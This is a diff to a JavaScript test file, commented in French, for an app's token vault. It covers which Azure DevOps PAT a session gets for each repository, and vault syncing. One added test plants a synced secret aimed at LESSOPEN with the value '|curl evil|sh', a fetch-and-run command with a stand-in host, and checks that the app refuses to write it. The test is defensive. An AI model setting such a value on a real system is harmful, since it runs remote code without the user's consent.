@@ -370,9 +370,9 @@ test('coffre : ajout sans valeur renvoyée, copier, PAT choisi selon l’organis
     assert.equal(list.body.items.find(x => x.id === bad.id).isDefault, true, 'premier PAT : par défaut');
     assert.equal((await api('POST', `/api/vault/${good.id}/reveal`)).value, 'bon-pat-azure');
     assert.equal((await req('POST', `/api/vault/${good.id}/reveal`, {}, { headers: { 'X-CSM-Token': 'mauvais' } })).status, 401);
-    // première session du dépôt : PAT par défaut, puis vérification en arrière-plan qui garde celui qui marche
+    // première session du dépôt : les PAT sont essayés avant le lancement, celui qui marche est donné et gardé
     const A = await api('POST', '/api/sessions', { cwd: repo, name: 'azure-1' });
-    assert.equal((await envOf(A.id)).AZURE_DEVOPS_PAT, 'mauvais-pat-azure');
+    assert.equal((await envOf(A.id)).AZURE_DEVOPS_PAT, 'bon-pat-azure');
     const v = await waitFor(async () => { const r = await api('GET', '/api/vault'); return r.items.find(x => x.id === good.id).mappedOrgs.includes('OrgTest') ? r : null; }, 10000, 'PAT retenu pour OrgTest');
     assert.equal(v.items.find(x => x.id === bad.id).orgs.OrgTest.ok, false, 'mauvais PAT marqué refusé');
     assert.ok(az.seen.every(x => x.url === '/OrgTest/_apis/connectionData'));
@@ -388,10 +388,20 @@ test('coffre : ajout sans valeur renvoyée, copier, PAT choisi selon l’organis
     const repo2 = path.join(TMP, 'depot-azure-2'); fs.mkdirSync(path.join(repo2, '.git'), { recursive: true });
     fs.writeFileSync(path.join(repo2, '.git', 'config'), '[remote "origin"]\n\turl = git@ssh.dev.azure.com:v3/AutreOrg/P/R\n');
     const C = await api('POST', '/api/sessions', { cwd: repo2, name: 'azure-3' });
-    await idle(C.id);
+    assert.equal((await envOf(C.id)).AZURE_DEVOPS_PAT, undefined, 'PAT par défaut refusé par cette organisation : rien donné');
     const w = await waitFor(async () => (await api('GET', '/api/vault')).warnings.find(x => x.org === 'AutreOrg'), 10000, 'avertissement');
     assert.match(w.url, /dev\.azure\.com\/AutreOrg\/_usersSettings\/tokens/);
     await api('DELETE', `/api/sessions/${C.id}`);
+    // hors d'un dépôt Azure DevOps : aucun PAT, sauf choisi pour ce dossier
+    const gh = path.join(TMP, 'depot-github'); fs.mkdirSync(path.join(gh, '.git'), { recursive: true });
+    fs.writeFileSync(path.join(gh, '.git', 'config'), '[remote "origin"]\n\turl = https://github.com/x/y.git\n');
+    const G = await api('POST', '/api/sessions', { cwd: gh, name: 'github' });
+    assert.equal((await envOf(G.id)).AZURE_DEVOPS_PAT, undefined, 'dépôt GitHub : pas de PAT');
+    await api('DELETE', `/api/sessions/${G.id}`);
+    await api('PUT', '/api/vault/folder', { cwd: gh, id: bad.id });
+    const G2 = await api('POST', '/api/sessions', { cwd: gh, name: 'github-2' });
+    assert.equal((await envOf(G2.id)).AZURE_DEVOPS_PAT, 'mauvais-pat-azure', 'PAT choisi pour ce dossier');
+    await api('DELETE', `/api/sessions/${G2.id}`);
   } finally {
     for (const id of ids) await req('DELETE', `/api/vault/${id}`);
     az.srv.close();
@@ -1518,6 +1528,11 @@ test('synchro : coffre chiffré, conflit sans écrasement, suppression, valeur c
     await api('POST', '/api/vault/conflict/0123456789ab', { keep: 'remote' });
     assert.equal((await api('POST', '/api/vault/0123456789ab/reveal')).value, 'pat-change-la-bas');
     assert.equal((await api('GET', '/api/vault')).conflicts.length, 0);
+    // secret reçu avec une cible dangereuse (machine compromise) : rien écrit, en attente de l'utilisateur
+    put('sec-0badbadbad01', { v: 1, id: '0badbadbad01', name: 'Piège', kind: 'secret', targets: { env: 'LESSOPEN' }, value: '|curl evil|sh', updated: Date.now(), origin: 'pc-bureau' });
+    const trap = await waitFor(async () => { await sync(); return (await api('GET', '/api/vault')).items.find(x => x.id === '0badbadbad01'); }, 10000, 'secret piège reçu'); ids.push('0badbadbad01');
+    assert.equal(trap.pendingTargets, true);
+    assert.ok(!(fs.existsSync(path.join(DATA, 'secrets.env')) && fs.readFileSync(path.join(DATA, 'secrets.env'), 'utf8').includes('LESSOPEN')), 'LESSOPEN jamais posé sans accord');
     // valeur changée hors de l'app (cible) : reprise et diffusée
     const envFile = path.join(DATA, 'secrets.env');
     const lines = fs.readFileSync(envFile, 'utf8').split('\n').filter(l => l && !l.startsWith('JETON_PARTAGE_TEST='));
